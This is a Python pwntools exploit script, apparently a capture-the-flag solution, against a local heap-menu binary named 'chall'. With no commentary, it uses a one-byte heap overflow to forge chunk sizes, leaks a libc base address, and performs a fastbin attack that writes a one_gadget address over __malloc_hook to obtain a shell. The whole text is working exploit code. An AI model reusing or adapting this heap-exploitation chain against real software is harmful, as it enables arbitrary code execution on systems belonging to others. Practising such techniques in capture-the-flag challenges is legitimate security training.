from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter(":",str(size))
	p.sendafter(":",c)
def free(idx):
	cmd(4)
	p.sendlineafter("id:",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:",str(idx))
	p.sendafter(":",c)
p=process("./chall")
libc=ELF("./chall").libc

add(0x18,"A"*0x18)#0
add(0x18,"A"*0x18)#1
add(0x100,p64(0x21)*31+'\n')#2
edit(0,"A"*0x18+'\x91')
free(1)
add(0x18,"A"*0x18)#1
show(2)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7f810568bb78-0x7f81052c7000)
log.warning(hex(base))
libc.address=base
add(0x68,"A\n")#3
add(0x18,"A"*0x18)#4
add(0x18,"A\n")#5
add(0x68,p64(0x21)*12+'\n')#6
edit(4,"A"*0x18+'\x81')
free(6)
free(5)
add(0x78,p64(0)*3+p64(0x71)+p64(libc.symbols['__malloc_hook']-35)+"\n")
add(0x68,"A\n")
one=0xf02a4
add(0x68,"\x00"*19+p64(one+base)+'\n')

gdb.attach(p,'b *0x000555555554DDD')

p.interactive()
